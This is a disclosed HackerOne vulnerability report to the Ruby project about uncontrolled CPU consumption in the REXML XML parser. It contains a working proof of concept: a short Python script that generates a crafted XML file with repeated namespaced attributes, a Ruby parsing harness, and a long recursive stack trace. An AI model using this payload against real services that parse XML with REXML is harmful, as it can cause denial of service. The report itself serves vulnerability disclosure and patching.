# Uncontrolled Resource Consumption when parsing maliciously crafted XML with REXML

## Report Details
- **Report ID**: 2666849
- **URL**: https://hackerone.com/reports/2666849
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2024-08-16T14:33:04.605Z
- **Disclosed**: 2025-02-20T15:21:12.291Z

## Reporter
- **Username**: l33thaxor
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
Paste this code into a python file:

```
start = ""
middle = "<a xml:b=\"\" b=\"\">" + "<D>" * 1
end = ""
print(start)
COUNT = 2000
for _ in range(COUNT):
	print(middle)
print(end)
```

and then redirect the output of this program to a file: `python pwn.py > pwn.xml`

then when this file is passed to `REXML::Document.new` in a program like this:

```
require 'timeout'
require 'rexml/document'

include REXML

puts "Reading input from stdin..."
input = ARGF.read
puts "Parsing input..."
REXML::Document.new input
puts "Done!"

```

the program hangs and CPU consumption jumps to 100%

The `CTRL-C` trace gives a hint at what could be going on:

```
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:623:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/attribute.rb:100:in `namespace'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/element.rb:2380:in `[]='
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/parsers/treeparser.rb:35:in `block in parse'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/parsers/treeparser.rb:34:in `each'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/parsers/treeparser.rb:34:in `parse'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/document.rb:448:in `build'
	from /usr/local/lib/ruby/gems/3.4.0+0/gems/rexml-3.3.5/lib/rexml/document.rb:101:in `initialize'
	from parse.rb:14:in `new'
	from parse.rb:14:in `block in target_function'
	from /usr/local/lib/ruby/3.4.0+0/timeout.rb:187:in `block in timeout'
	from /usr/local/lib/ruby/3.4.0+0/timeout.rb:42:in `handle_timeout'
	from /usr/local/lib/ruby/3.4.0+0/timeout.rb:196:in `timeout'
	from parse.rb:11:in `target_function'
	from parse.rb:25:in `<main>
```

on my machine, the 42kb size exploit file created by the python script took about 13 minutes to parse.

I have attached all of my files which I used during testing as a zip file as `investigation_files.zip`.

## Impact

Uncontrolled resource consumption which may lead to denial of service. There are many other REXML DOS vulnerabilities and the impact is basically the same in this new bug as in these previous bugs:

```
https://www.ruby-lang.org/en/news/2024/05/16/dos-rexml-cve-2024-35176/
https://www.ruby-lang.org/en/news/2024/07/16/dos-rexml-cve-2024-39908/
https://www.ruby-lang.org/en/news/2024/08/01/dos-rexml-cve-2024-41123/
```

## Attachments
- investigation_files.zip
